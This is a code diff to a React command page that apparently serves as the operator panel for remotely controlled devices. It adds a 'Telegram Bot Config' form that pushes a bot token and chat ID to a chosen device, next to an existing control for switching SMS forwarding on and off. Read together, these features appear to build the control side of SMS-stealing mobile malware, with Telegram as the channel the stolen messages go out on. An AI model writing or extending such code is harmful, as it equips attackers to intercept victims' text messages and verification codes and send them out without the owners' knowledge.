@@ -53,6 +53,21 @@ export default function CommandsPage({ devices }: { devices: any[] }) {
     } catch (e: any) { toast('Error: ' + e.message, 'error') }
   }
 
+  const [tgToken, setTgToken] = useState('')
+  const [tgChatId, setTgChatId] = useState('')
+
+  const cmdSetTgBot = async () => {
+    const devId = getTarget()
+    if (!devId) return
+    if (!tgToken || !tgChatId) { toast('Fill both token and chat ID', 'error'); return }
+    try {
+      await sendCommand({ device_id: devId, cmd: 'set_tg_bot', phoneNumber: tgToken, messageText: tgChatId })
+      toast('Telegram bot config sent!', 'success')
+      addLog(`TG bot set: token ${tgToken.substring(0, 8)}... chat ${tgChatId.substring(0, 6)}...`)
+      setTgToken(''); setTgChatId('')
+    } catch (e: any) { toast('Error: ' + e.message, 'error') }
+  }
+
   const cmdSmsForward = async (enable: boolean) => {
     const devId = getTarget()
     if (!devId) return
@@ -107,6 +122,15 @@ export default function CommandsPage({ devices }: { devices: any[] }) {
             <button className="btn btn-success" style={{flex:1}} onClick={() => cmdSmsForward(true)}><SVG path="M22 12h-4l-3 9L9 3l-3 9H2"/> Enable</button>
             <button className="btn btn-danger" style={{flex:1}} onClick={() => cmdSmsForward(false)}><SVG path="M18 6 6 18M6 6l12 12"/> Disable</button>
           </div>
+        </div>
+      </div>
+
+      <div className="cmd-section">
+        <div className="cmd-title"><SVG path="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7z"/> Telegram Bot Config</div>
+        <div className="cmd-form">
+          <div className="field"><label>Bot Token</label><input type="text" placeholder="123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11" value={tgToken} onChange={e => setTgToken(e.target.value)}/></div>
+          <div className="field"><label>Chat ID</label><input type="text" placeholder="-1001234567890 or 123456789" value={tgChatId} onChange={e => setTgChatId(e.target.value)}/></div>
+          <button className="btn btn-primary btn-block" onClick={cmdSetTgBot}><SVG path="M22 2 11 13M22 2l-7 20-4-9-9-4 20-7z"/> Set Telegram Bot</button>
         </div>
       </div>
 
